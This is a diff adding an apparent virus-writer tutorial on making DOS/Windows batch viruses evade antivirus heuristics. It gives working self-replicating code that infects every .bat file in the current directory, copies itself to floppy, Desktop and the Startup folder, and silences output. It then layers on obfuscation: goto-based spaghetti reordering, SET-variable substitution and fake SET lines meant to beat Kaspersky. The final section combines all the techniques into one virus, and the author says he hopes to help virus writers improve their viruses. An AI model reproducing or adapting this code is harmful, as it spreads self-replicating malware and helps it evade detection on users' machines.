@@ -1,0 +1,215 @@
+				BATCH vs. Heuristic
+
+I want to tell you now something about techiques of BAT viruses, to be don't detect by the AV's heuristic.
+
+1.) MAIN-CODE
+2.) Spaghetti-Code Technique
+3.) Anti MySelf Detection
+4.) SET-Operation Technique
+5.) Anti SET-Includeing Technique (Fake Set OP)
+6.) All together
+
+
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+
+1.) MAIN-CODE
+
+We need a main code for that:
+
+	@echo off
+	ctty nul
+	copy %0 A:\*.bat
+	for %%v in (*.bat) do copy %0 %%v
+	copy %0 %windir%\Desktop\open.bat
+	copy %0 %windir%\startm~1\programs\autost~1\start.bat
+
+This is our main Code! What does this Code?
+It copy itself:
+-> To a Disk
+-> To the Desktop
+-> To the english AutoStart
+and
+It infect all *.bat files in the currend direction!
+
+OK, I think, this wasn't hard to understand!
+
+
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+
+2.) Spaghetti-Code technique
+
+If you write an batch virus, it is really easy to analyse, so it's easy to detect it!
+But what can you do against this?
+You can disorder your code in cubes! But how does it work?
+Look at this Code (Main Code):
+
+Fist you have to include a label before every line and a goto after every line:
+
+	:aa
+	@echo off
+	goto ab
+	:ab
+	ctty nul
+	goto ac
+	:ac
+	copy %0 A:\*.bat
+	goto ad
+	:ad
+	for %%v in (*.bat) do copy %0 %%v
+	goto ae
+	:ae
+	copy %0 %windir%\Desktop\open.bat
+	goto af
+	:af
+	copy %0 %windir%\startm~1\programs\autost~1\start.bat
+	goto end
+	:end
+
+Why did you do this? Because you have to cube every line with the label and goto!
+Like this (don't forget the "goto aa" at first!!):
+	
+	goto aa
+	:ac
+	copy %0 A:\*.bat
+	goto ad
+	:aa
+	@echo off
+	goto ab
+	:ad
+	for %%v in (*.bat) do copy %0 %%v
+	goto ae
+	:ab
+	ctty nul
+	goto ac
+	:af
+	copy %0 %windir%\startm~1\programs\autost~1\start.bat
+	goto end
+	:ae
+	copy %0 %windir%\Desktop\open.bat
+	goto af
+	:end
+
+OK! Now the batch virus isn't as simple as before to analyze and to detect! ;-)
+
+
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+
+3.) Anti MySelf Detection
+
+Every normal AV programs heuristic knows, that the strings "copy %0" must be a virus!
+So they or there heuristic detect the file!
+What is to do? We have to delete the %0, but how?
+Use the set OP, like this (you know: the main-code)!
+
+
+	@echo off
+	ctty nul
+	set MyS=%0
+	copy %MyS% A:\*.bat
+	for %%v in (*.bat) do copy %MyS% %%v
+	copy %MyS% %windir%\Desktop\open.bat
+	copy %MyS% %windir%\startm~1\programs\autost~1\start.bat
+
+The option "%MyS%" is the same as %0, but the AVs don't detect it!
+
+
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+
+4.) SET-Operation technique
+
+You know, that the main-code is easy to anlyze and detect, so i developed a new technique!
+You use the command SET (like the "Anti MySelf Detection"):
+
+	@echo off
+	ctty nul
+	set spth=copy
+	%spth% %0 A:\*.bat
+	set rof=for
+	%rof% %%v in (*.bat) do %spth% %0 %%v
+	%spth% %0 %windir%\Desktop\open.bat
+	set ss=start
+	set pp=progra
+	%spth% %0 %windir%\%start%m~1\%pp%ms\autost~1\start.bat
+
+This is of corse harder to detect. If you have a longer batch-code, it will be harder and harder...
+
+
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+
+5.) Anti SET-Includeing Technique (Fake Set OP)
+
+Kaspersky Anti Virus (KAV) is able to include the SETs to the lines 
+(because of my Batch Worm Generator *bg*)! So, what to do?
+You must include a Fake-SET-line! That means a line, who contains a false code before of the real
+code! Look at this:
+
+	@echo off
+	ctty nul
+	set spth=trhs
+	set spth=copy
+	%spth% %0 A:\*.bat
+	set rof=fds
+	set rof=for
+	%rof% %%v in (*.bat) do %spth% %0 %%v
+	%spth% %0 %windir%\Desktop\open.bat
+	set ss=mhxb
+	set ss=start
+	set pp=gfdfd
+	set pp=progra
+	%spth% %0 %windir%\%start%m~1\%pp%ms\autost~1\start.bat
+
+I think, you understand me!
+
+
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+6.) All together
+
+This is the silly virus, includeing all the techniques I introduced:
+
+	goto aa
+	:ac
+	copy %MyS% A:\*.bat
+	goto ad
+	:aa
+	@echo off
+	goto ab
+	:ad
+	set rof=dfg
+	set rof=for
+	%rof% %%v in (*.bat) do %spth% %MyS% %%v
+	goto ae
+	:ab
+	ctty nul
+	set spth=nffg
+	set spth=copy
+	set MyS=ztru
+	set MyS=%0
+	goto ac
+	:af
+	set da=gfd
+	set da=prog
+	%spth% %MyS% %windir%\startm~1\%da%rams\autost~1\start.bat
+	goto end
+	:ae
+	%spth% %MyS% %windir%\Desktop\open.bat
+	goto af
+	:end
+
+I think, this code is much better than the old main-code virus!! ;-)
+
+
+ * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+
+
+I hope, I could help some virii programer to improve there viriis!
+
+greets,
+SeCoNd PaRt To HeLl
+spth@jet2web.cc
+http://www.spth.de.vu
